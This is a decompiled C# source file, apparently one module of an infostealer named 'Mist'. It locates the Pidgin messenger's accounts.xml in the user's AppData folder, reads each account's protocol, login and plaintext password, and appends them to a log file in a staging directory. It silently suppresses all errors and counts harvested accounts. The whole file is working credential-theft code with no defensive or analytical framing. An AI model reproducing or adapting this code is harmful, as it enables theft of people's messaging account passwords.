using System;
using System.IO;
using System.Text;
using System.Xml;

namespace Mist
{
	// Token: 0x02000053 RID: 83
	internal class Pidgin
	{
		// Token: 0x0600022E RID: 558 RVA: 0x00005761 File Offset: 0x00003961
		public static void Start(string directorypath)
		{
			if (File.Exists(Pidgin.PidginPath))
			{
				Directory.CreateDirectory(directorypath + "\\Jabber\\Pidgin\\");
				Pidgin.GetDataPidgin(Pidgin.PidginPath, directorypath + "\\Jabber\\Pidgin\\Pidgin.log");
				return;
			}
		}

		// Token: 0x0600022F RID: 559 RVA: 0x00010634 File Offset: 0x0000E834
		public static void GetDataPidgin(string PathPn, string SaveFile)
		{
			try
			{
				if (File.Exists(PathPn))
				{
					try
					{
						XmlDocument xmlDocument = new XmlDocument();
						xmlDocument.Load(new XmlTextReader(PathPn));
						foreach (object obj in xmlDocument.DocumentElement.ChildNodes)
						{
							XmlNode xmlNode = (XmlNode)obj;
							string innerText = xmlNode.ChildNodes[0].InnerText;
							string innerText2 = xmlNode.ChildNodes[1].InnerText;
							string innerText3 = xmlNode.ChildNodes[2].InnerText;
							if (string.IsNullOrEmpty(innerText) || string.IsNullOrEmpty(innerText2) || string.IsNullOrEmpty(innerText3))
							{
								break;
							}
							Pidgin.SBTwo.AppendLine("Protocol: " + innerText);
							Pidgin.SBTwo.AppendLine("Login: " + innerText2);
							Pidgin.SBTwo.AppendLine("Password: " + innerText3 + "\r\n");
							Pidgin.PidginAkks++;
							Pidgin.PidginCount++;
						}
						if (Pidgin.SBTwo.Length > 0)
						{
							try
							{
								File.AppendAllText(SaveFile, Pidgin.SBTwo.ToString());
							}
							catch
							{
							}
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400011F RID: 287
		public static int PidginCount = 0;

		// Token: 0x04000120 RID: 288
		public static int PidginAkks = 0;

		// Token: 0x04000121 RID: 289
		private static readonly string PidginPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".purple\\accounts.xml");

		// Token: 0x04000122 RID: 290
		private static StringBuilder SBTwo = new StringBuilder();
	}
}
